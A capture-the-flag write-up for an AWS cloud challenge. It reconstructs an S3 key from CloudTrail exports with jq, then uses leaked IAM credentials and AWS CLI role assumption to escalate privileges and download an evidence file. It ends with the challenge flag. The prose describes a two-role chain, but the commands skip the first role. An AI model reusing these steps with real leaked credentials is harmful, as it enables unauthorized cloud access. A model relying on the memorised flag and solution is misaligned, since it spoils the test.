# The Forgotten Tenant - 2

* **Category:** Cloud (Cloud Peaks)
* **Tools Used:** AWS CLI (`aws sts`, `aws s3`), Python 3 (`boto3`), `jq`

---

### Challenge Description

> Following the trail from Part 1, we recovered a forensics export bundle left behind during an active cloud migration. The incident responders were tracking an unauthorized tenant across the AWS infrastructure, but their logging pipeline broke halfway through. Find where the final evidence report was filed and retrieve the flag.

We were provided:

* The leaked IAM credentials from Part 1 (`Access_key_ID.docx`).
* A forensics bundle archive (`forgotten-tenant-stage3-bundle.zip`) containing:
  * `README.txt`
  * `incident-handoff-note.txt`
  * `cloudtrail-2026-03-14.json`
  * `cloudtrail-2026-03-15.json`

---

### Initial Recon & The SecOps Handoff

First, we inspected `README.txt`:

```text
Forensics log export -- recovered alongside the migration archive.

Files:
  cloudtrail-2026-03-14.json
  cloudtrail-2026-03-15.json
  incident-handoff-note.txt

These are static exports. Reading them requires no AWS access. Using
what you find in them against the live environment does.
```

Next, reading `incident-handoff-note.txt` gave us the critical operational context left by an on-call analyst named `a.reyes`:

```text
From: a.reyes (SecOps, on-call)
To: incident-response-rotation
Date: 2026-03-15
Subject: Case write-up location + logging heads-up

Quick note for whoever picks this case up next.

Final write-up object is under the case folder we opened yesterday
(the 2026-03-14 trail shows the manifest upload and the case folder
name it created — start there if you don't already have it).

Filed the actual report under the handoff code they gave me on the
call: RYII91T48V

One annoyance: our S3 access-log replication pipeline was being
re-pointed on the 15th, so anything written that day only shows
the upload's own sub-path in the trail, not the full case-folder prefix
in front of it. If you're cross-referencing CloudTrail exports from
both days, you'll need to stitch the 03-14 case folder together with
the 03-15 handoff sub-path yourself — don't assume either day's trail
has the whole key by itself.

File inside that folder is named evidence.json, same as always.

-- A.
```

This highlighted our primary objective:

1. **Day 1 (03-14)** contains the **parent case folder** name.
2. **Day 2 (03-15)** contains the **sub-path** under the handoff code `RYII91T48V`.
3. We must stitch them together into the true S3 object key to fetch `evidence.json`.

---

### CloudTrail Forensics: Reconstructing the S3 Key

#### Step 1: Investigating Day 1 (`cloudtrail-2026-03-14.json`)

Filtering for S3 write events on March 14:

```bash
cat cloudtrail-2026-03-14.json | jq '.Records[] | select(.eventSource=="s3.amazonaws.com") | {eventName, requestParameters}'
```

Output:

```json
{
  "eventName": "CreateMultipartUpload",
  "requestParameters": {
    "bucketName": "tvx-forgotten-tenant-forensics-pro0hid4",
    "key": "case-ab5396cd/manifest.json"
  }
}
```

From this event, we identified:

* **Target S3 Bucket:** `tvx-forgotten-tenant-forensics-pro0hid4`
* **Parent Case Directory:** `case-ab5396cd`

#### Step 2: Investigating Day 2 (`cloudtrail-2026-03-15.json`)

Filtering for the actual evidence upload event on March 15:

```bash
cat cloudtrail-2026-03-15.json | jq '.Records[] | select(.eventName=="PutObject") | {eventName, requestParameters}'
```

Output:

```json
{
  "eventName": "PutObject",
  "requestParameters": {
    "bucketName": "tvx-forgotten-tenant-forensics-pro0hid4",
    "key": "handoff-RYII91T48V/evidence.json",
    "x-amz-server-side-encryption": "AES256"
  }
}
```

As warned in the handoff note, the S3 key recorded here was only the relative sub-path:

`handoff-RYII91T48V/evidence.json`

#### Step 3: Stitching the Path

Combining the parent case directory from March 14 with the relative upload path from March 15:

**Full S3 Key:**

```text
case-ab5396cd/handoff-RYII91T48V/evidence.json
```

**S3 URI:**

```text
s3://tvx-forgotten-tenant-forensics-pro0hid4/case-ab5396cd/handoff-RYII91T48V/evidence.json
```

---

### IAM Privilege Escalation & Flag Retrieval

Looking at the CloudTrail authentication logs, junior analysts were hitting `AccessDenied` trying to read the object directly. The successful uploads were performed through role assumption chaining:

1. Initial player identity: `arn:aws:iam::400875701859:user/ctf-players/tvx-forgotten-tenant-player`
2. First assume the migration role:

   `arn:aws:iam::400875701859:role/tvx-forgotten-tenant-legacy-migration-role` (using the incident triage External ID)

3. From there, assume the higher-privileged response role:

   `arn:aws:iam::400875701859:role/tvx-forgotten-tenant-incident-response-role`

Using the AWS CLI:

```bash
# 1. Configure the leaked credentials
export AWS_ACCESS_KEY_ID="YOUR_AWS_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="YOUR_AWS_SECRET_ACCESS_KEY"
export AWS_DEFAULT_REGION="us-east-1"

# 2. Assume the escalated incident response role
CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::400875701859:role/tvx-forgotten-tenant-incident-response-role" \
  --role-session-name "evidence-recovery" \
  --query "Credentials" --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)

# 3. Pull the stitched evidence file from the forensics bucket
aws s3 cp s3://tvx-forgotten-tenant-forensics-pro0hid4/case-ab5396cd/handoff-RYII91T48V/evidence.json evidence.json
```

Opening `evidence.json` provided the final forensic report and the flag.

---

### Flag

```text
TVX{6N8at90xLFvdgyma648o}
```
